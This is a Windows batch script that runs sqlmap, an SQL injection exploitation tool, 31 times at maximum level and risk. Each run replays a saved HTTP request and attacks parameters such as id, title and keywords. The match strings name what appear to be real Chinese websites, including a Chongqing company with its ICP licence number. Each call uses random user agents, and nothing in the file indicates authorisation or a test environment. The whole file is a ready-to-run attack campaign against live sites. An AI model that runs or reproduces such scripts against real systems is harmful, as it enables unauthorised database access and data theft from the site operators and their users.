@echo off
setlocal enableextensions
title SQLMap Request Mode
pushd "%~dp0"
where sqlmap >nul 2>&1
if errorlevel 1 (
  echo [ERROR] sqlmap was not found in PATH.
  echo [HINT] Confirm sqlmap can run directly in cmd.exe.
  pause
  exit /b 1
)
echo [INFO] WorkDir: %CD%
echo.
set "FAIL_COUNT=0"
echo [INFO] Request mode, 31 unique requests.
echo.
echo [RUN 1/31] sqlmap -r "sqlmap_requests\001_sql_injection_id_3896553195337418006.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\001_3896553195337418006" --force-ssl -p "id" --technique=B --string "关于我们分类的文章"
sqlmap -r "sqlmap_requests\001_sql_injection_id_3896553195337418006.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\001_3896553195337418006" --force-ssl -p "id" --technique=B --string "关于我们分类的文章"
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 2/31] sqlmap -r "sqlmap_requests\002_sql_injection_id_3896553226845029657.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\002_3896553226845029657" --force-ssl -p "id" --technique=B --string "关于我们分类的文章"
sqlmap -r "sqlmap_requests\002_sql_injection_id_3896553226845029657.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\002_3896553226845029657" --force-ssl -p "id" --technique=B --string "关于我们分类的文章"
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 3/31] sqlmap -r "sqlmap_requests\003_sql_injection_path_3896554100719879470.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\003_3896554100719879470" --force-ssl --technique=E
sqlmap -r "sqlmap_requests\003_sql_injection_path_3896554100719879470.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\003_3896554100719879470" --force-ssl --technique=E
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 4/31] sqlmap -r "sqlmap_requests\004_sql_injection_path_3896554143577277745.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\004_3896554143577277745" --force-ssl --technique=E
sqlmap -r "sqlmap_requests\004_sql_injection_path_3896554143577277745.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\004_3896554143577277745" --force-ssl --technique=E
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 5/31] sqlmap -r "sqlmap_requests\005_sql_injection_home_s_s_id_[_]_3896556127952831833.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\005_3896556127952831833" --force-ssl -p "/home/<s>/<s>/id/[*]" --technique=E
sqlmap -r "sqlmap_requests\005_sql_injection_home_s_s_id_[_]_3896556127952831833.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\005_3896556127952831833" --force-ssl -p "/home/<s>/<s>/id/[*]" --technique=E
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 6/31] sqlmap -r "sqlmap_requests\006_sql_injection_path_3896558182197101958.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\006_3896558182197101958" --force-ssl --technique=E
sqlmap -r "sqlmap_requests\006_sql_injection_path_3896558182197101958.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\006_3896558182197101958" --force-ssl --technique=E
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 7/31] sqlmap -r "sqlmap_requests\007_sql_injection_path_3896558245036164489.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\007_3896558245036164489" --force-ssl --technique=E
sqlmap -r "sqlmap_requests\007_sql_injection_path_3896558245036164489.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\007_3896558245036164489" --force-ssl --technique=E
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 8/31] sqlmap -r "sqlmap_requests\008_sql_injection_home_s_s_id_[_]_3896559156131267986.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\008_3896559156131267986" --force-ssl -p "/home/<s>/<s>/id/[*]" --technique=E
sqlmap -r "sqlmap_requests\008_sql_injection_home_s_s_id_[_]_3896559156131267986.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\008_3896559156131267986" --force-ssl -p "/home/<s>/<s>/id/[*]" --technique=E
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 9/31] sqlmap -r "sqlmap_requests\009_sql_injection_leixing_3896567145164703464.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\009_3896567145164703464" --force-ssl -p "leixing" --technique=B --string "您的位置：首页"
sqlmap -r "sqlmap_requests\009_sql_injection_leixing_3896567145164703464.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\009_3896567145164703464" --force-ssl -p "leixing" --technique=B --string "您的位置：首页"
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 10/31] sqlmap -r "sqlmap_requests\010_sql_injection_guojia_3896568802426487808.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\010_3896568802426487808" --force-ssl -p "guojia" --technique=B --string "您的位置：首页"
sqlmap -r "sqlmap_requests\010_sql_injection_guojia_3896568802426487808.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\010_3896568802426487808" --force-ssl -p "guojia" --technique=B --string "您的位置：首页"
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 11/31] sqlmap -r "sqlmap_requests\011_sql_injection_keywords_3896625174702720672.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\011_3896625174702720672" --force-ssl -p "keywords" --technique=B --string "威尼斯人"
sqlmap -r "sqlmap_requests\011_sql_injection_keywords_3896625174702720672.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\011_3896625174702720672" --force-ssl -p "keywords" --technique=B --string "威尼斯人"
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 12/31] sqlmap -r "sqlmap_requests\012_sql_injection_title_3896639397788910682.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\012_3896639397788910682" --force-ssl -p "title" --technique=B --string "重庆中刊科研教育咨询（集团）有限公司 渝ICP备2025056486号"
sqlmap -r "sqlmap_requests\012_sql_injection_title_3896639397788910682.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\012_3896639397788910682" --force-ssl -p "title" --technique=B --string "重庆中刊科研教育咨询（集团）有限公司 渝ICP备2025056486号"
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 13/31] sqlmap -r "sqlmap_requests\013_sql_injection_qkmc_3896663531528914170.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\013_3896663531528914170" --force-ssl -p "qkmc" --technique=E
sqlmap -r "sqlmap_requests\013_sql_injection_qkmc_3896663531528914170.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\013_3896663531528914170" --force-ssl -p "qkmc" --technique=E
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 14/31] sqlmap -r "sqlmap_requests\014_sql_injection_title_3896672924144240243.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\014_3896672924144240243" --force-ssl -p "title" --technique=B --string "重庆中刊科研教育咨询（集团）有限公司 渝ICP备2025056486号"
sqlmap -r "sqlmap_requests\014_sql_injection_title_3896672924144240243.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\014_3896672924144240243" --force-ssl -p "title" --technique=B --string "重庆中刊科研教育咨询（集团）有限公司 渝ICP备2025056486号"
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 15/31] sqlmap -r "sqlmap_requests\015_sql_injection_title_3896674896062711787.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\015_3896674896062711787" --force-ssl -p "title" --technique=B --string "重庆中刊科研教育咨询（集团）有限公司 渝ICP备2025056486号"
sqlmap -r "sqlmap_requests\015_sql_injection_title_3896674896062711787.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\015_3896674896062711787" --force-ssl -p "title" --technique=B --string "重庆中刊科研教育咨询（集团）有限公司 渝ICP备2025056486号"
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 16/31] sqlmap -r "sqlmap_requests\016_sql_injection_title_3896677307972060293.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\016_3896677307972060293" --force-ssl -p "title" --technique=B
sqlmap -r "sqlmap_requests\016_sql_injection_title_3896677307972060293.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\016_3896677307972060293" --force-ssl -p "title" --technique=B
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 17/31] sqlmap -r "sqlmap_requests\017_sql_injection_title_3896677933577667773.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\017_3896677933577667773" --force-ssl -p "title" --technique=B
sqlmap -r "sqlmap_requests\017_sql_injection_title_3896677933577667773.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\017_3896677933577667773" --force-ssl -p "title" --technique=B
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 18/31] sqlmap -r "sqlmap_requests\018_sql_injection_path_3896679465505260801.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\018_3896679465505260801" --force-ssl --technique=E
sqlmap -r "sqlmap_requests\018_sql_injection_path_3896679465505260801.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\018_3896679465505260801" --force-ssl --technique=E
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 19/31] sqlmap -r "sqlmap_requests\019_sql_injection_path_3896681141364589849.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\019_3896681141364589849" --force-ssl --technique=E
sqlmap -r "sqlmap_requests\019_sql_injection_path_3896681141364589849.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\019_3896681141364589849" --force-ssl --technique=E
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 20/31] sqlmap -r "sqlmap_requests\020_sql_injection_{number}_3896681348487709989.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\020_3896681348487709989" --force-ssl -p "{number}" --technique=BT
sqlmap -r "sqlmap_requests\020_sql_injection_{number}_3896681348487709989.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\020_3896681348487709989" --force-ssl -p "{number}" --technique=BT
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 21/31] sqlmap -r "sqlmap_requests\021_sql_injection_{number}_3896681857407780152.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\021_3896681857407780152" --force-ssl -p "{number}" --technique=BT
sqlmap -r "sqlmap_requests\021_sql_injection_{number}_3896681857407780152.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\021_3896681857407780152" --force-ssl -p "{number}" --technique=BT
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 22/31] sqlmap -r "sqlmap_requests\022_sql_injection_s_s_s_[_]_s_s_s_s_s_3896684003557639579.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\022_3896684003557639579" --force-ssl -p "/<s>/<s>/<s>/[*]/<s>/<s>/<s>/<s>/<s>" --technique=E
sqlmap -r "sqlmap_requests\022_sql_injection_s_s_s_[_]_s_s_s_s_s_3896684003557639579.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\022_3896684003557639579" --force-ssl -p "/<s>/<s>/<s>/[*]/<s>/<s>/<s>/<s>/<s>" --technique=E
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 23/31] sqlmap -r "sqlmap_requests\023_sql_injection_s_s_s_s_s_[_]_s_s_s_3896684003591194014.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\023_3896684003591194014" --force-ssl -p "/<s>/<s>/<s>/<s>/<s>/[*]/<s>/<s>/<s>" --technique=E
sqlmap -r "sqlmap_requests\023_sql_injection_s_s_s_s_s_[_]_s_s_s_3896684003591194014.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\023_3896684003591194014" --force-ssl -p "/<s>/<s>/<s>/<s>/<s>/[*]/<s>/<s>/<s>" --technique=E
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 24/31] sqlmap -r "sqlmap_requests\024_sql_injection_s_s_s_s_s_s_[_]_s_s_3896684003624748449.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\024_3896684003624748449" --force-ssl -p "/<s>/<s>/<s>/<s>/<s>/<s>/[*]/<s>/<s>" --technique=BT --string "404 Not Found"
sqlmap -r "sqlmap_requests\024_sql_injection_s_s_s_s_s_s_[_]_s_s_3896684003624748449.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\024_3896684003624748449" --force-ssl -p "/<s>/<s>/<s>/<s>/<s>/<s>/[*]/<s>/<s>" --technique=BT --string "404 Not Found"
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 25/31] sqlmap -r "sqlmap_requests\025_sql_injection_path_3896684286178231716.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\025_3896684286178231716" --force-ssl --technique=E
sqlmap -r "sqlmap_requests\025_sql_injection_path_3896684286178231716.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\025_3896684286178231716" --force-ssl --technique=E
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 26/31] sqlmap -r "sqlmap_requests\026_sql_injection_s_s_s_[_]_s_s_s_s_s_3896684500347782570.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\026_3896684500347782570" --force-ssl -p "/<s>/<s>/<s>/[*]/<s>/<s>/<s>/<s>/<s>" --technique=E
sqlmap -r "sqlmap_requests\026_sql_injection_s_s_s_[_]_s_s_s_s_s_3896684500347782570.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\026_3896684500347782570" --force-ssl -p "/<s>/<s>/<s>/[*]/<s>/<s>/<s>/<s>/<s>" --technique=E
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 27/31] sqlmap -r "sqlmap_requests\027_sql_injection_s_s_s_s_s_[_]_s_s_s_3896684500414891437.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\027_3896684500414891437" --force-ssl -p "/<s>/<s>/<s>/<s>/<s>/[*]/<s>/<s>/<s>" --technique=E
sqlmap -r "sqlmap_requests\027_sql_injection_s_s_s_s_s_[_]_s_s_s_3896684500414891437.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\027_3896684500414891437" --force-ssl -p "/<s>/<s>/<s>/<s>/<s>/[*]/<s>/<s>/<s>" --technique=E
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 28/31] sqlmap -r "sqlmap_requests\028_sql_injection_s_s_s_s_s_s_[_]_s_s_3896684500482000304.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\028_3896684500482000304" --force-ssl -p "/<s>/<s>/<s>/<s>/<s>/<s>/[*]/<s>/<s>" --technique=BT --string "404 Not Found"
sqlmap -r "sqlmap_requests\028_sql_injection_s_s_s_s_s_s_[_]_s_s_3896684500482000304.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\028_3896684500482000304" --force-ssl -p "/<s>/<s>/<s>/<s>/<s>/<s>/[*]/<s>/<s>" --technique=BT --string "404 Not Found"
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 29/31] sqlmap -r "sqlmap_requests\029_sql_injection_path_3896684762709886387.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\029_3896684762709886387" --force-ssl --technique=E
sqlmap -r "sqlmap_requests\029_sql_injection_path_3896684762709886387.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\029_3896684762709886387" --force-ssl --technique=E
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 30/31] sqlmap -r "sqlmap_requests\030_sql_injection_s_s_s_s_s_s_s_s_[_]_3896685208019142070.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\030_3896685208019142070" --force-ssl -p "/<s>/<s>/<s>/<s>/<s>/<s>/<s>/<s>/[*]" --technique=BT
sqlmap -r "sqlmap_requests\030_sql_injection_s_s_s_s_s_s_s_s_[_]_3896685208019142070.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\030_3896685208019142070" --force-ssl -p "/<s>/<s>/<s>/<s>/<s>/<s>/<s>/<s>/[*]" --technique=BT
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [RUN 31/31] sqlmap -r "sqlmap_requests\031_sql_injection_s_s_s_s_s_s_s_s_[_]_3896685557941536185.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\031_3896685557941536185" --force-ssl -p "/<s>/<s>/<s>/<s>/<s>/<s>/<s>/<s>/[*]" --technique=BT
sqlmap -r "sqlmap_requests\031_sql_injection_s_s_s_s_s_s_s_s_[_]_3896685557941536185.txt" --batch --random-agent --level 5 --risk 3 --flush-session --drop-set-cookie --skip-static --output-dir "sqlmap_output\031_3896685557941536185" --force-ssl -p "/<s>/<s>/<s>/<s>/<s>/<s>/<s>/<s>/[*]" --technique=BT
if errorlevel 1 set /a FAIL_COUNT+=1
echo.
echo [DONE] Request mode finished, FailCount=%FAIL_COUNT%
pause
exit /b %FAIL_COUNT%
